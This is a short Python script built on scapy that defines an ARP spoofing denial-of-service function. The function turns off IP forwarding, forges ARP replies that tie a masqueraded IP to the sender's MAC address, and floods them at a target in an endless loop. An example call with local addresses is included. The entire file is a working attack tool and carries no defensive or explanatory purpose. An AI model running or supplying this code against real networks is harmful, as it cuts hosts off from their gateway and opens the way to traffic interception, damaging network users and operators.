from scapy.all import *
from scans import *
import subprocess
import os
#masq_ip: ip we masquerade as.
#masc_mac: Masqueraded mac address
#source_mac: Our mac address
#Dest IP: target ip
#Dest Mac: target mac address
#ex: arpDos("10.0.0.1", "00:0c:29:5f:e7:50", "b8:27:eb:c2:1c:52", "10.0.0.57", "00:0c:29:08:45:1a")
def arpDos(masq_ip, masq_mac, source_mac, dest_ip, dest_mac):
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    packet = ARP()
    packet.op = 2
    packet.psrc = masq_ip
    packet.pdst = dest_ip
    packet.hwdst = dest_mac
    packet.hwsrc = source_mac
    send(packet)
    while True:
        send(packet)
        sniff(filter="arp and host " + masq_ip, count=1)

